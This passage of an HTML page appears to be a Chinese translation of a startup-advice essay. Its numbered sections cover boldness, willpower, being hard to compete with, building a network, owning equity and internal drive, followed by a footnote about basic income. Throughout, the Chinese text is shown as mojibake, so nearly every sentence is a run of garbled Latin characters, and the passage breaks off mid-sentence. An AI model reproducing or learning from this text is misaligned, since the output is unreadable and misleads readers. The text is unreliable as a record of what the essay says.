æ‰€åœ¨é¢†åŸŸçš„ç¬¬90ä¸ªç™¾åˆ†ç‚¹ï¼Œè¿™ä»ç„¶æ˜¯ä¸€ä¸ªä¼Ÿå¤§çš„æˆå°±ã€‚ä½†æ˜¯ï¼Œè¦æƒ³è¾¾åˆ°ç¬¬99ç™¾åˆ†ä½æ•°ï¼Œåˆ™éœ€è¦ä¸¤è€…å…¼å¤‡â€“ä½ å°†ä¸å…¶ä»–éå¸¸æœ‰æ‰åçš„äººç«äº‰ï¼Œä»–ä»¬ä¼šæœ‰å¾ˆå¥½çš„æƒ³æ³•ï¼Œå¹¶æ„¿æ„ä»˜å‡ºå¾ˆå¤šåŠªåŠ›ã€‚</p><p>æç«¯çš„äººå¾—åˆ°æç«¯çš„ç»“æœã€‚å¤§é‡å·¥ä½œä¼´éšç€å·¨å¤§çš„ç”Ÿæ´»æƒè¡¡ï¼Œå†³å®šä¸è¿™æ ·åšæ˜¯å®Œå…¨ç†æ€§çš„ã€‚ä½†å®ƒä¹Ÿæœ‰å¾ˆå¤šä¼˜ç‚¹ã€‚å°±åƒåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ä¸€æ ·ï¼ŒåŠ¿å¤´ä¼šè¶Šæ¥è¶Šå¤§ï¼ŒæˆåŠŸä¼šå¸¦æ¥æˆåŠŸã€‚</p><p>è€Œä¸”å®ƒå¾€å¾€éå¸¸æœ‰è¶£ã€‚ç”Ÿæ´»ä¸­æœ€å¤§çš„ä¹è¶£ä¹‹ä¸€æ˜¯æ‰¾åˆ°ä½ çš„ç›®çš„ï¼Œåœ¨è¿™æ–¹é¢è¡¨ç°å‡ºè‰²ï¼Œå¹¶å‘ç°ä½ çš„å½±å“æ¯”ä½ è‡ªå·±æ›´é‡è¦ã€‚ä¸€ä½YCçš„åˆ›å§‹äººæœ€è¿‘è¡¨ç¤ºéå¸¸æƒŠè®¶ï¼Œåœ¨ç¦»å¼€å¤§å…¬å¸çš„å·¥ä½œåï¼Œä»–å˜å¾—æ›´åŠ å¿«ä¹å’Œå……å®ï¼Œå¹¶ä¸ºè‡ªå·±çš„æœ€å¤§å½±å“åŠ›è€ŒåŠªåŠ›ã€‚åœ¨è¿™ä¸€ç‚¹ä¸ŠåŠªåŠ›å·¥ä½œåº”è¯¥å¾—åˆ°èµè®¸ã€‚ </p><p>æˆ‘å¹¶ä¸å®Œå…¨æ¸…æ¥šä¸ºä»€ä¹ˆåœ¨ç¾å›½çš„æŸäº›åœ°æ–¹ï¼ŒåŠªåŠ›å·¥ä½œå·²ç»æˆä¸ºä¸€ä»¶åäº‹ï¼Œä½†åœ¨ä¸–ç•Œå…¶ä»–åœ°æ–¹è‚¯å®šä¸æ˜¯è¿™æ ·çš„â€“ç¾å›½ä»¥å¤–çš„ä¼ä¸šå®¶æ‰€è¡¨ç°å‡ºæ¥çš„èƒ½é‡å’ŒåŠ¨åŠ›æ­£è¿…é€Ÿæˆä¸ºæ–°çš„åŸºå‡†ã€‚</p><p>ä½ å¿…é¡»å¼„æ¸…æ¥šå¦‚ä½•åŠªåŠ›å·¥ä½œè€Œä¸è‡³äºç­‹ç–²åŠ›å°½ã€‚äººä»¬ä¸ºæ­¤æ‰¾åˆ°è‡ªå·±çš„ç­–ç•¥ï¼Œä½†æœ‰ä¸€ä¸ªå‡ ä¹æ€»æ˜¯æœ‰æ•ˆçš„ç­–ç•¥æ˜¯æ‰¾åˆ°ä½ å–œæ¬¢çš„å·¥ä½œï¼Œä¸ä½ å–œæ¬¢èŠ±å¾ˆå¤šæ—¶é—´çš„äººä¸€èµ·å·¥ä½œã€‚</p><p>æˆ‘è®¤ä¸ºé‚£äº›å‡è£…ä½ å¯ä»¥åœ¨èŒä¸šä¸Šå–å¾—å·¨å¤§æˆåŠŸè€Œä¸éœ€è¦å¤§éƒ¨åˆ†æ—¶é—´ï¼ˆåœ¨ä½ ç”Ÿå‘½ä¸­çš„æŸä¸ªæ—¶æœŸï¼‰å·¥ä½œçš„äººæ˜¯åœ¨åšä¸€ä»¶åäº‹ã€‚äº‹å®ä¸Šï¼Œå·¥ä½œè€åŠ›ä¼¼ä¹æ˜¯é•¿æœŸæˆåŠŸçš„æœ€å¤§é¢„æµ‹å› ç´ ä¹‹ä¸€ã€‚</p><p>å…³äºåŠªåŠ›å·¥ä½œè¿˜æœ‰ä¸€ä¸ªæƒ³æ³•ï¼šåœ¨ä½ çš„èŒä¸šç”Ÿæ¶¯å¼€å§‹æ—¶å°±åŠªåŠ›å·¥ä½œã€‚è‰°è‹¦çš„å·¥ä½œå°±åƒåˆ©æ¯ä¸€æ ·å¤åˆ©ï¼Œä½ è¶Šæ—©åšï¼Œä½ å°±æœ‰è¶Šå¤šçš„æ—¶é—´æ¥è·å¾—å›æŠ¥ã€‚å½“ä½ æœ‰è¾ƒå°‘çš„å…¶ä»–è´£ä»»æ—¶ï¼Œä¹Ÿæ›´å®¹æ˜“åŠªåŠ›å·¥ä½œï¼Œè¿™åœ¨ä½ å¹´è½»çš„æ—¶å€™ç»å¸¸å‘ç”Ÿï¼Œä½†å¹¶ä¸æ€»æ˜¯è¿™æ ·ã€‚</p><h2 id="8-å¤§èƒ†ä¸€ç‚¹"><a href="#8-å¤§èƒ†ä¸€ç‚¹" class="headerlink" title="8. å¤§èƒ†ä¸€ç‚¹"></a>8. å¤§èƒ†ä¸€ç‚¹</h2><p>æˆ‘ç›¸ä¿¡ï¼Œåšä¸€ä¸ªè‰°éš¾çš„åˆ›ä¸šå…¬å¸æ¯”åšä¸€ä¸ªå®¹æ˜“çš„åˆ›ä¸šå…¬å¸æ›´å®¹æ˜“ã€‚äººä»¬å¸Œæœ›æˆä¸ºä»¤äººå…´å¥‹çš„äº‹æƒ…çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶æ„Ÿåˆ°ä»–ä»¬çš„å·¥ä½œå¾ˆé‡è¦ã€‚</p><p>å¦‚æœä½ åœ¨ä¸€ä¸ªé‡è¦çš„é—®é¢˜ä¸Šå–å¾—äº†è¿›å±•ï¼Œä½ å°†ä¼šæœ‰ä¸€ä¸ªæŒç»­çš„å°¾å·´ï¼Œäººä»¬æƒ³è¦å¸®åŠ©ä½ ã€‚è®©è‡ªå·±å˜å¾—æ›´æœ‰é‡å¿ƒï¼Œä¸è¦å®³æ€•ä»äº‹ä½ çœŸæ­£æƒ³åšçš„å·¥ä½œã€‚</p><p>å¦‚æœå…¶ä»–äººéƒ½åœ¨åˆ›åŠå¤‡å¿˜å½•å…¬å¸ï¼Œè€Œä½ æƒ³åˆ›åŠä¸€å®¶åŸºå› ç¼–è¾‘å…¬å¸ï¼Œé‚£å°±å»åšï¼Œä¸è¦çŒœæµ‹ã€‚</p><p>éµå¾ªä½ çš„å¥½å¥‡å¿ƒã€‚å¯¹ä½ æ¥è¯´ä¼¼ä¹å¾ˆå…´å¥‹çš„äº‹æƒ…ï¼Œå¾€å¾€ä¹Ÿä¼šè®©å…¶ä»–äººæ„Ÿåˆ°å…´å¥‹ã€‚</p><h2 id="9-è¦æœ‰æ„å¿—åŠ›"><a href="#9-è¦æœ‰æ„å¿—åŠ›" class="headerlink" title="9.è¦æœ‰æ„å¿—åŠ›"></a>9.è¦æœ‰æ„å¿—åŠ›</h2><p>ä¸€ä¸ªå¾ˆå¤§çš„ç§˜å¯†æ˜¯ï¼Œä½ å¯ä»¥åœ¨ä»¤äººæƒŠè®¶çš„æ—¶é—´å†…ä½¿ä¸–ç•Œå±ˆæœäºä½ çš„æ„å¿—ï¼Œå¤§å¤šæ•°äººç”šè‡³æ²¡æœ‰å°è¯•ï¼Œè€Œåªæ˜¯æ¥å—äº‹æƒ…æ˜¯ä»–ä»¬çš„æ–¹å¼ã€‚</p><p>äººä»¬æœ‰ä¸€ç§å·¨å¤§çš„èƒ½åŠ›æ¥ä½¿äº‹æƒ…å‘ç”Ÿã€‚è‡ªæˆ‘æ€€ç–‘ã€è¿‡æ—©æ”¾å¼ƒå’Œä¸å¤ŸåŠªåŠ›ç­‰å› ç´ ç»“åˆåœ¨ä¸€èµ·ï¼Œä½¿å¤§å¤šæ•°äººæ— æ³•è¾¾åˆ°æ¥è¿‘å…¶æ½œåŠ›çš„ç¨‹åº¦ã€‚</p><p>è¦æ±‚å¾—åˆ°ä½ æƒ³è¦çš„ä¸œè¥¿ã€‚ä½ é€šå¸¸ä¸ä¼šå¾—åˆ°å®ƒï¼Œè€Œä¸”å¾€å¾€æ‹’ç»ä¼šå¾ˆç—›è‹¦ã€‚ä½†å½“è¿™ä¸€æ–¹æ³•å¥æ•ˆæ—¶ï¼Œå®ƒçš„æ•ˆæœå‡ºå¥‡åœ°å¥½ã€‚</p><p>å‡ ä¹æ€»æ˜¯è¿™æ ·ï¼Œé‚£äº›è¯´ â€œæˆ‘è¦ä¸€ç›´èµ°ä¸‹å»ï¼Œç›´åˆ°æˆåŠŸä¸ºæ­¢ï¼Œä¸ç®¡æœ‰ä»€ä¹ˆæŒ‘æˆ˜ï¼Œæˆ‘éƒ½è¦æŠŠå®ƒä»¬è§£å†³æ‰ â€œçš„äººï¼Œå¹¶ä¸”æ˜¯è®¤çœŸçš„ï¼Œä¼šç»§ç»­å–å¾—æˆåŠŸã€‚ä»–ä»¬åšæŒäº†è¶³å¤Ÿé•¿çš„æ—¶é—´ï¼Œç»™è‡ªå·±ä¸€ä¸ªæœºä¼šï¼Œè®©å¹¸è¿é™ä¸´åˆ°ä»–ä»¬èº«ä¸Šã€‚</p><p>Airbnbæ˜¯æˆ‘åœ¨è¿™æ–¹é¢çš„åŸºå‡†ã€‚ä»–ä»¬æœ‰å¾ˆå¤šæ•…äº‹ï¼Œæˆ‘ä¸å»ºè®®å°è¯•å¤åˆ¶ï¼ˆæŠŠåˆ·çˆ†çš„ä¿¡ç”¨å¡æ”¾åœ¨å­©å­ä»¬ç”¨æ¥è£…æ£’çƒå¡çš„ä¹æ§½ä¸‰ç¯å¤¹å­é‡Œï¼Œæ¯é¡¿éƒ½åƒä¸€å…ƒåº—çš„éº¦ç‰‡ï¼Œä¸å¼ºå¤§çš„åˆ©ç›Šé›†å›¢è¿›è¡Œä¸€åœºåˆä¸€åœºçš„æ–—äº‰ï¼Œç­‰ç­‰ï¼‰ï¼Œä½†ä»–ä»¬è®¾æ³•ç”Ÿå­˜äº†è¶³å¤Ÿé•¿çš„æ—¶é—´ï¼Œè®©è¿æ°”é¡ºç€ä»–ä»¬ã€‚</p><p>è¦æƒ³æˆä¸ºæœ‰æ„å¿—åŠ›çš„äººï¼Œä½ å¿…é¡»è¦ä¹è§‚â€“å¸Œæœ›è¿™æ˜¯ä¸€ä¸ªå¯ä»¥é€šè¿‡å®è·µæ¥æ”¹å–„çš„äººæ ¼ç‰¹è´¨ã€‚æˆ‘ä»æœªè§è¿‡ä¸€ä¸ªéå¸¸æˆåŠŸçš„æ‚²è§‚ä¸»ä¹‰è€…ã€‚</p><h2 id="10-å¾ˆéš¾ä¸ä¹‹ç«äº‰"><a href="#10-å¾ˆéš¾ä¸ä¹‹ç«äº‰" class="headerlink" title="10. å¾ˆéš¾ä¸ä¹‹ç«äº‰"></a>10. å¾ˆéš¾ä¸ä¹‹ç«äº‰</h2><p>å¤§å¤šæ•°äººéƒ½æ˜ç™½ï¼Œå¦‚æœå…¬å¸éš¾ä»¥ä¸ä¹‹ç«äº‰ï¼Œå°±æ›´æœ‰ä»·å€¼ã€‚è¿™å¾ˆé‡è¦ï¼Œæ˜¾ç„¶ä¹Ÿæ˜¯äº‹å®ã€‚</p><p>ä½†è¿™å¯¹ä½œä¸ºä¸ªäººçš„ä½ ä¹Ÿæ˜¯å¦‚æ­¤ã€‚å¦‚æœä½ æ‰€åšçš„äº‹æƒ…å¯ä»¥ç”±åˆ«äººæ¥åšï¼Œé‚£ä¹ˆæœ€ç»ˆå°±ä¼šç”±åˆ«äººæ¥åšï¼Œè€Œä¸”èŠ±çš„é’±æ›´å°‘ã€‚</p><p>å˜å¾—éš¾ä»¥ä¸ä¹‹ç«äº‰çš„æœ€å¥½æ–¹æ³•æ˜¯å»ºç«‹æ æ†ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥é€šè¿‡ä¸ªäººå…³ç³»ï¼Œé€šè¿‡å»ºç«‹ä¸€ä¸ªå¼ºå¤§çš„ä¸ªäººå“ç‰Œï¼Œæˆ–è€…é€šè¿‡åœ¨å¤šä¸ªä¸åŒé¢†åŸŸçš„äº¤å‰ç‚¹ä¸Šè·å¾—ä¼˜åŠ¿æ¥åšåˆ°è¿™ä¸€ç‚¹ã€‚è¿˜æœ‰è®¸å¤šå…¶ä»–ç­–ç•¥ï¼Œä½†ä½ å¿…é¡»æƒ³å‡ºä¸€äº›åŠæ³•æ¥åšã€‚</p><p>å¤§å¤šæ•°äººåšä»–ä»¬æ‰€äº¤å¾€çš„å¤§å¤šæ•°äººåšçš„äº‹ã€‚è¿™ç§æ¨¡ä»¿è¡Œä¸ºé€šå¸¸æ˜¯ä¸ªé”™è¯¯â€“å¦‚æœä½ åšçš„æ˜¯åˆ«äººéƒ½åœ¨åšçš„äº‹æƒ…ï¼Œä½ å°†ä¸éš¾ä¸ä¹‹ç«äº‰ã€‚</p><h2 id="11-å»ºç«‹ä¸€ä¸ªç½‘ç»œ"><a href="#11-å»ºç«‹ä¸€ä¸ªç½‘ç»œ" class="headerlink" title="11. å»ºç«‹ä¸€ä¸ªç½‘ç»œ"></a>11. å»ºç«‹ä¸€ä¸ªç½‘ç»œ</h2><p>ä¼Ÿå¤§çš„å·¥ä½œéœ€è¦å›¢é˜Ÿã€‚å‘å±•ä¸€ä¸ªç”±æœ‰æ‰åçš„äººç»„æˆçš„å·¥ä½œç½‘ç»œâ€“æœ‰æ—¶æ˜¯ç´§å¯†çš„ï¼Œæœ‰æ—¶æ˜¯æ¾æ•£çš„â€“æ˜¯ä¼Ÿå¤§äº‹ä¸šçš„ä¸€ä¸ªé‡è¦ç»„æˆéƒ¨åˆ†ã€‚ä½ æ‰€è®¤è¯†çš„çœŸæ­£æœ‰æ‰åçš„äººçš„ç½‘ç»œçš„å¤§å°å¾€å¾€æˆä¸ºä½ èƒ½å–å¾—æˆå°±çš„é™åˆ¶å› ç´ ã€‚</p><p>å»ºç«‹ç½‘ç»œçš„ä¸€ä¸ªæœ‰æ•ˆæ–¹æ³•æ˜¯å°½å¯èƒ½åœ°å¸®åŠ©åˆ«äººã€‚åœ¨å¾ˆé•¿ä¸€æ®µæ—¶é—´å†…ï¼Œè¿™æ ·åšæ˜¯å¯¼è‡´æˆ‘æœ€å¥½çš„èŒä¸šæœºä¼šå’Œæˆ‘å››ä¸ªæœ€å¥½çš„æŠ•èµ„ä¸­çš„ä¸‰ä¸ªçš„åŸå› ã€‚æˆ‘ä¸æ–­æ„Ÿåˆ°æƒŠè®¶ï¼Œå› ä¸ºæˆ‘åå¹´å‰å¸®åŠ©ä¸€ä½åˆ›å§‹äººçš„äº‹æƒ…ï¼Œç»å¸¸æœ‰å¥½äº‹å‘ç”Ÿåœ¨æˆ‘èº«ä¸Šã€‚</p><p>å»ºç«‹ç½‘ç»œçš„æœ€å¥½æ–¹æ³•ä¹‹ä¸€æ˜¯å»ºç«‹ä¸€ä¸ªçœŸæ­£ç…§é¡¾åˆ°ä¸ä½ åˆä½œçš„äººçš„å£°èª‰ã€‚è¦è¿‡åˆ†æ…·æ…¨åœ°åˆ†äº«å¥½å¤„ï¼›è¿™å°†ä¼šç»™ä½ å¸¦æ¥10å€çš„å›æŠ¥ã€‚å¦å¤–ï¼Œå­¦ä¼šå¦‚ä½•è¯„ä¼°äººä»¬çš„é•¿å¤„ï¼Œå¹¶è®©ä»–ä»¬æ‹…ä»»è¿™äº›èŒåŠ¡ã€‚(è¿™æ˜¯æˆ‘åœ¨ç®¡ç†æ–¹é¢å­¦åˆ°çš„æœ€é‡è¦çš„ä¸œè¥¿ï¼Œè€Œæˆ‘å¹¶æ²¡æœ‰è¯»è¿‡å¾ˆå¤šè¿™æ–¹é¢çš„ä¹¦ï¼‰ã€‚ä½ è¦æœ‰ä¸€ä¸ªå£ç¢‘ï¼Œé‚£å°±æ˜¯æŠŠäººé€¼å¾—å¤Ÿç‹ ï¼Œä½¿ä»–ä»¬çš„æˆå°±è¶…è¿‡ä»–ä»¬çš„æƒ³è±¡ï¼Œä½†åˆä¸è‡³äºè®©ä»–ä»¬å€¦æ€ ã€‚</p><p>æ¯ä¸ªäººåœ¨æŸäº›æ–¹é¢éƒ½æ¯”å…¶ä»–äººå¼ºã€‚ç”¨ä½ çš„ä¼˜åŠ¿æ¥å®šä¹‰ä½ è‡ªå·±ï¼Œè€Œä¸æ˜¯ä½ çš„å¼±ç‚¹ã€‚æ‰¿è®¤ä½ çš„å¼±ç‚¹å¹¶æƒ³åŠæ³•è§£å†³å®ƒä»¬ï¼Œä½†ä¸è¦è®©å®ƒä»¬é˜»æ­¢ä½ åšä½ æƒ³åšçš„äº‹ã€‚â€æˆ‘ä¸èƒ½åšXï¼Œå› ä¸ºæˆ‘ä¸æ“…é•¿Yâ€ï¼Œè¿™æ˜¯æˆ‘ç»å¸¸ä»ä¼ä¸šå®¶é‚£é‡Œå¬åˆ°çš„ï¼Œè€Œä¸”å‡ ä¹æ€»æ˜¯åæ˜ å‡ºç¼ºä¹åˆ›é€ åŠ›ã€‚å¼¥è¡¥ä½ çš„å¼±ç‚¹çš„æœ€å¥½æ–¹æ³•æ˜¯é›‡ç”¨äº’è¡¥çš„å›¢é˜Ÿæˆå‘˜ï¼Œè€Œä¸æ˜¯ä»…ä»…é›‡ç”¨é‚£äº›æ“…é•¿ä½ æ‰€åšçš„åŒæ ·äº‹æƒ…çš„äººã€‚</p><p>å»ºç«‹ç½‘ç»œçš„ä¸€ä¸ªç‰¹åˆ«æœ‰ä»·å€¼çš„éƒ¨åˆ†æ˜¯è¦å–„äºå‘ç°æœªè¢«å‘ç°çš„äººæ‰ã€‚é€šè¿‡ç»ƒä¹ ï¼Œå¿«é€Ÿå‘ç°æ™ºæ…§ã€åŠ¨åŠ›å’Œåˆ›é€ åŠ›å˜å¾—æ›´åŠ å®¹æ˜“ã€‚æœ€ç®€å•çš„å­¦ä¹ æ–¹æ³•å°±æ˜¯è®¤è¯†å¾ˆå¤šäººï¼Œå¹¶è·Ÿè¸ªè°ä¼šç»™ä½ ç•™ä¸‹æ·±åˆ»å°è±¡ï¼Œè°ä¸ä¼šã€‚è®°ä½ï¼Œä½ ä¸»è¦æ˜¯åœ¨å¯»æ‰¾æ”¹è¿›çš„é€Ÿåº¦ï¼Œä¸è¦é«˜ä¼°ç»éªŒæˆ–å½“å‰çš„æˆå°±ã€‚</p><p>å½“æˆ‘é‡åˆ°æ–°çš„äººæ—¶ï¼Œæˆ‘è¯•ç€æ€»æ˜¯é—®è‡ªå·±ï¼šâ€è¿™ä¸ªäººæ˜¯ä¸€ä¸ªè‡ªç„¶çš„åŠ›é‡å—ï¼Ÿâ€ è¿™æ˜¯ä¸€ä¸ªç›¸å½“å¥½çš„å¯å‘å¼æ–¹æ³•ï¼Œå¯ä»¥æ‰¾åˆ°é‚£äº›æœ‰å¯èƒ½å®Œæˆä¼Ÿå¤§äº‹ä¸šçš„äººã€‚</p><p>å‘å±•ç½‘ç»œçš„ä¸€ä¸ªç‰¹æ®Šæƒ…å†µæ˜¯æ‰¾åˆ°çŸ¥åäººå£«ä¸ºä½ ä¸‹æ³¨ï¼Œæœ€å¥½æ˜¯åœ¨ä½ èŒä¸šç”Ÿæ¶¯çš„æ—©æœŸã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œæ¯«ä¸å¥‡æ€ªï¼Œæœ€å¥½çš„åŠæ³•æ˜¯ä¸é—ä½™åŠ›åœ°æä¾›å¸®åŠ©ã€‚(è¯·è®°ä½ï¼Œä½ å¿…é¡»åœ¨ä»¥åçš„æŸä¸ªæ—¶é—´ç‚¹ä¸ŠæŠŠè¿™äº›é’±äº¤å‡ºæ¥ï¼ï¼‰ã€‚</p><p>æœ€åï¼Œè®°å¾—æŠŠä½ çš„æ—¶é—´èŠ±åœ¨æ”¯æŒä½ é›„å¿ƒå£®å¿—çš„ç§¯æäººå£«èº«ä¸Šã€‚</p><h2 id="12-ä½ é€šè¿‡æ‹¥æœ‰ä¸œè¥¿è€Œè‡´å¯Œ"><a href="#12-ä½ é€šè¿‡æ‹¥æœ‰ä¸œè¥¿è€Œè‡´å¯Œ" class="headerlink" title="12. ä½ é€šè¿‡æ‹¥æœ‰ä¸œè¥¿è€Œè‡´å¯Œ"></a>12. ä½ é€šè¿‡æ‹¥æœ‰ä¸œè¥¿è€Œè‡´å¯Œ</h2><p>æˆ‘ç«¥å¹´æ—¶æœ€å¤§çš„ç»æµè¯¯åŒºæ˜¯äººä»¬é€šè¿‡é«˜è–ªè‡´å¯Œã€‚è™½ç„¶æœ‰ä¸€äº›ä¾‹å¤–â€“ä¾‹å¦‚å¨±ä¹ç•Œäººå£«â€“ä½†åœ¨ç¦å¸ƒæ–¯æ¦œå•çš„å†å²ä¸Šï¼Œå‡ ä¹æ²¡æœ‰äººæ˜¯é å·¥èµ„è·å¾—çš„ã€‚</p><p>ä½ é€šè¿‡æ‹¥æœ‰å¿«é€Ÿå¢å€¼çš„ä¸œè¥¿æ¥è·å¾—çœŸæ­£çš„è´¢å¯Œã€‚</p><p>è¿™å¯ä»¥æ˜¯ä¸€ä¸ªä¼ä¸šçš„ä¸€éƒ¨åˆ†ï¼Œæˆ¿åœ°äº§ï¼Œè‡ªç„¶èµ„æºï¼ŒçŸ¥è¯†äº§æƒï¼Œæˆ–å…¶ä»–ç±»ä¼¼çš„ä¸œè¥¿ã€‚ä½†æ— è®ºå¦‚ä½•ï¼Œä½ éœ€è¦æ‹¥æœ‰æŸäº›ä¸œè¥¿çš„è‚¡æƒï¼Œè€Œä¸æ˜¯ä»…ä»…å‡ºå”®ä½ çš„æ—¶é—´ã€‚æ—¶é—´åªæ˜¯çº¿æ€§æ‰©å±•çš„ã€‚</p><p>åˆ¶é€ å¿«é€Ÿå¢å€¼çš„ä¸œè¥¿çš„æœ€å¥½æ–¹æ³•æ˜¯å¤§è§„æ¨¡åˆ¶é€ äººä»¬æƒ³è¦çš„ä¸œè¥¿ã€‚</p><h2 id="13-è¦æœ‰å†…éƒ¨é©±åŠ¨åŠ›"><a href="#13-è¦æœ‰å†…éƒ¨é©±åŠ¨åŠ›" class="headerlink" title="13. è¦æœ‰å†…éƒ¨é©±åŠ¨åŠ›"></a>13. è¦æœ‰å†…éƒ¨é©±åŠ¨åŠ›</h2><p>å¤§å¤šæ•°äººä¸»è¦æ˜¯å—å¤–éƒ¨é©±åŠ¨ï¼›ä»–ä»¬åšä»–ä»¬æ‰€åšçš„äº‹æ˜¯å› ä¸ºä»–ä»¬æƒ³ç»™å…¶ä»–äººç•™ä¸‹æ·±åˆ»å°è±¡ã€‚è¿™æœ‰å¾ˆå¤šä¸å¥½çš„åŸå› ï¼Œä½†è¿™é‡Œæœ‰ä¸¤ä¸ªé‡è¦çš„åŸå› ã€‚</p><p>é¦–å…ˆï¼Œä½ å°†åœ¨åå•†ä¸€è‡´çš„æƒ³æ³•å’Œåå•†ä¸€è‡´çš„èŒä¸šè½¨é“ä¸Šå·¥ä½œã€‚ ä½ ä¼šéå¸¸å…³å¿ƒâ€“æ¯”ä½ æ„è¯†åˆ°çš„è¦å¤šå¾—å¤šâ€“å…¶ä»–äººæ˜¯å¦è®¤ä¸ºä½ åœ¨åšæ­£ç¡®çš„äº‹æƒ…ã€‚è¿™å¯èƒ½ä¼šé˜»æ­¢ä½ åšçœŸæ­£æœ‰è¶£çš„å·¥ä½œï¼Œå³ä½¿ä½ åšäº†ï¼Œåˆ«äººä¹Ÿä¼šåšã€‚</p><p>ç¬¬äºŒï¼Œä½ é€šå¸¸ä¼šæŠŠé£é™©è®¡ç®—å¼„é”™ã€‚ä½ ä¼šéå¸¸ä¸“æ³¨äºè·Ÿä¸Šåˆ«äººçš„æ­¥ä¼ï¼Œåœ¨ç«äº‰æ€§æ¸¸æˆä¸­ä¸æ‰é˜Ÿï¼Œå³ä½¿æ˜¯åœ¨çŸ­æœŸå†…ã€‚</p><p>èªæ˜äººä¼¼ä¹ç‰¹åˆ«å®¹æ˜“å‡ºç°è¿™ç§å¤–åœ¨é©±åŠ¨çš„è¡Œä¸ºã€‚æ„è¯†åˆ°è¿™ä¸€ç‚¹æœ‰å¸®åŠ©ï¼Œä½†åªæ˜¯ä¸€ç‚¹ç‚¹â€“ä½ å¾ˆå¯èƒ½è¦ä»˜å‡ºè¶…å¼ºçš„åŠªåŠ›æ‰ä¸ä¼šè½å…¥æ¨¡ä»¿çš„é™·é˜±ã€‚</p><p>æˆ‘æ‰€çŸ¥é“çš„æœ€æˆåŠŸçš„äººä¸»è¦æ˜¯ç”±å†…éƒ¨é©±åŠ¨çš„ï¼›ä»–ä»¬æ‰€åšçš„äº‹æƒ…æ˜¯ä¸ºäº†ç»™è‡ªå·±ç•™ä¸‹æ·±åˆ»å°è±¡ï¼Œä¹Ÿæ˜¯å› ä¸ºä»–ä»¬æ„Ÿåˆ°æœ‰å¿…è¦åœ¨è¿™ä¸ªä¸–ç•Œä¸Šæœ‰æ‰€ä½œä¸ºã€‚åœ¨ä½ èµšå¤Ÿäº†é’±ï¼Œå¯ä»¥ä¹°åˆ°ä½ æƒ³è¦çš„ä»»ä½•ä¸œè¥¿ï¼Œå¾—åˆ°äº†è¶³å¤Ÿçš„ç¤¾ä¼šåœ°ä½ï¼Œä¸å†ä»¥è·å¾—æ›´å¤šçš„ä¸œè¥¿ä¸ºä¹è¶£ä¹‹åï¼Œè¿™æ˜¯æˆ‘æ‰€çŸ¥é“çš„å”¯ä¸€çš„åŠ›é‡ï¼Œä¼šç»§ç»­æ¨åŠ¨ä½ è¾¾åˆ°æ›´é«˜çš„è¡¨ç°æ°´å¹³ã€‚</p><p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¸€ä¸ªäººçš„åŠ¨æœºé—®é¢˜æ˜¯å¦‚æ­¤é‡è¦ã€‚è¿™æ˜¯æˆ‘è¯•å›¾äº†è§£ä¸€ä¸ªäººçš„ç¬¬ä¸€ä»¶äº‹ã€‚æ­£ç¡®çš„åŠ¨æœºå¾ˆéš¾å®šä¹‰ä¸€å¥—è§„åˆ™ï¼Œä½†å½“ä½ çœ‹åˆ°å®ƒæ—¶ï¼Œä½ å°±ä¼šçŸ¥é“å®ƒã€‚</p><p>æ°è¥¿å¡-åˆ©æ–‡æ–¯é¡¿å’Œä¿ç½—-æ ¼é›·å„å§†æ˜¯æˆ‘è¿™æ–¹é¢çš„æ ‡æ†ã€‚YCåœ¨æœ€åˆå‡ å¹´è¢«å¹¿æ³›å˜²ç¬‘ï¼Œåœ¨ä»–ä»¬åˆšå¼€å§‹çš„æ—¶å€™å‡ ä¹æ²¡æœ‰äººè®¤ä¸ºå®ƒä¼šå¤§è·æˆåŠŸã€‚ä½†ä»–ä»¬è®¤ä¸ºï¼Œå¦‚æœå®ƒèƒ½æˆåŠŸï¼Œå¯¹ä¸–ç•Œæ¥è¯´æ˜¯ä»¶å¥½äº‹ï¼Œè€Œä¸”ä»–ä»¬å–œæ¬¢å¸®åŠ©äººï¼Œä»–ä»¬åšä¿¡ä»–ä»¬çš„æ–°æ¨¡å¼æ¯”ç°æœ‰æ¨¡å¼æ›´å¥½ã€‚</p><p>æœ€ç»ˆï¼Œä½ å°†é€šè¿‡åœ¨å¯¹ä½ å¾ˆé‡è¦çš„é¢†åŸŸè¿›è¡Œå‡ºè‰²çš„å·¥ä½œæ¥å®šä¹‰ä½ çš„æˆåŠŸã€‚ä½ è¶Šæ—©æœè¿™ä¸ªæ–¹å‘èµ·æ­¥ï¼Œä½ å°±èƒ½èµ°å¾—è¶Šè¿œã€‚ä½ å¾ˆéš¾åœ¨ä½ ä¸ç—´è¿·çš„äº‹æƒ…ä¸Šå–å¾—å·¨å¤§çš„æˆåŠŸã€‚</p><h2 id="1-æˆ‘åœ¨HNä¸Šå†™çš„ä¸€ä¸ªè¯„è®ºå›åº”ã€‚"><a href="#1-æˆ‘åœ¨HNä¸Šå†™çš„ä¸€ä¸ªè¯„è®ºå›åº”ã€‚" class="headerlink" title="[1] æˆ‘åœ¨HNä¸Šå†™çš„ä¸€ä¸ªè¯„è®ºå›åº”ã€‚"></a>[1] æˆ‘åœ¨HNä¸Šå†™çš„ä¸€ä¸ªè¯„è®ºå›åº”ã€‚</h2><p>æˆ‘å¯¹åŸºæœ¬æ”¶å…¥æ„Ÿåˆ°å…´å¥‹çš„æœ€å¤§åŸå› ä¹‹ä¸€æ˜¯ï¼Œå®ƒå°†é€šè¿‡é‡Šæ”¾æ›´å¤šçš„äººå»å†’é™©è€Œé‡Šæ”¾å‡ºå¤§é‡çš„äººç±»æ½œåŠ›ã€‚<br>åœ¨æ­¤ä¹‹å‰ï¼Œå¦‚æœä½ ä¸æ˜¯å¤©ç”Ÿçš„å¹¸è¿å„¿ï¼Œä½ å¿…é¡»åœ¨å¤§æ‘‡å¤§æ‘†ä¹‹å‰åŠªåŠ›å¥‹æ–—ä¸€é˜µå­ã€‚å¦‚æœä½ 